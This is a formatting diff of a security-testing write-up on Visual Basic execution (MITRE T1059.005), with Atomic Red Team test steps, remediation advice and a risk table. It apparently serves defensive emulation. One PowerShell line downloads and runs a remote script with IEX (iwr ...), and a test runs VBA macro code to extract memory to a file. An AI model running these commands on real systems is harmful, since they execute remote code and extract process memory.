@@ -96,6 +96,7 @@ cscript "#{vbscript}" > $env:TEMP\T1059.005.out.txt
 ```
 
 **Dependencies:**
+
 - Sample script must exist on disk at specified location (#{vbscript})
 
 ### Atomic Test 2: Encoded VBS code execution
@@ -115,6 +116,7 @@ Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.
 ```
 
 **Dependencies:**
+
 - The 64-bit version of Microsoft Office must be installed
 
 ### Atomic Test 3: Extract Memory via VBA
@@ -127,13 +129,13 @@ memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.b
 
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
 Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"
 ```
 
 **Dependencies:**
-- Microsoft #{ms_product} must be installed
 
+- Microsoft #{ms_product} must be installed
 
 ### Manual Testing
 
@@ -148,44 +150,46 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1042 Disable or Remove Feature or Program
+
 Turn off or restrict access to unneeded VB components.
 
 ### M1049 Antivirus/Antimalware
+
 Anti-virus can be used to automatically quarantine suspicious files.
 
 ### M1038 Execution Prevention
+
 Use application control where appropriate. VBA macros obtained from the Internet, based on the file's Mark of the Web (MOTW) attribute, may be blocked from executing in Office applications (ex: Access, Excel, PowerPoint, Visio, and Word) by default starting in Windows Version 2203.
 
 ### M1040 Behavior Prevention on Endpoint
+
 On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic scripts from executing potentially malicious downloaded content .
 
 ### M1021 Restrict Web-Based Content
-Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.
 
+Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.
 
 ## Detection
 
 ### Behavioral Detection of Visual Basic Execution (VBS/VBA/VBScript)
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Visual Basic technique applicable | High | Execution |
+| Finding                           | Severity | Impact    |
+| --------------------------------- | -------- | --------- |
+| Visual Basic technique applicable | High     | Execution |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID | Title                                  |
+| ------ | -------------------------------------- |
 | CWE-94 | Improper Control of Generation of Code |
-
 
 ## References
 
 - [VB .NET Mar 2020](https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/)
 - [Default VBS macros Blocking ](https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805)
-- [Microsoft VBScript](https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85))
+- [Microsoft VBScript](<https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)>)
 - [Microsoft VBA](https://docs.microsoft.com/office/vba/api/overview/)
 - [VB Microsoft](https://docs.microsoft.com/dotnet/visual-basic/)
 - [Wikipedia VBA](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications)
